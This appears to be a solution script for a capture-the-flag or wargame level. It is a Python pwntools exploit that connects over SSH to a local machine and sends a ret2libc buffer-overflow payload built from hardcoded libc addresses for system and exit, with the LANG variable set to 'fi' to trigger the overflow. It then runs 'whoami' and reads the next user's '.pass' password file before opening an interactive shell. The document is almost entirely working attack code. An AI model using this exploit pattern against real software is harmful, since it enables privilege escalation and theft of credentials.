#!/usr/bin/env python

from pwn import *
from time import *
import os

cwd = os.getcwd()
host = "127.0.0.1"
port = 4242

login = "bonus2"
binary = login
password = open(cwd + "/bonus1/flag", "r").read().splitlines()[0]
remotebinary = "/home/user/%s/%s" % (login, binary)

target_login = "bonus3"

shell = ssh(host=host, port=port, user=login, password=password)

system_addr = p32(0xb7e6b060)
str_addr = p32(0xb7f8cc58)
exit_addr = p32(0xb7e5ebe0)
padding = "B"*18

payload = padding + system_addr + exit_addr + str_addr

payload2 = "B"*200

print("# Sending")
p = shell.process([remotebinary, payload2, payload], env={'LANG': 'fi'})

p.clean()
p.sendline("whoami")
p.sendline("cat ~%s/.pass" % target_login)
p.interactive()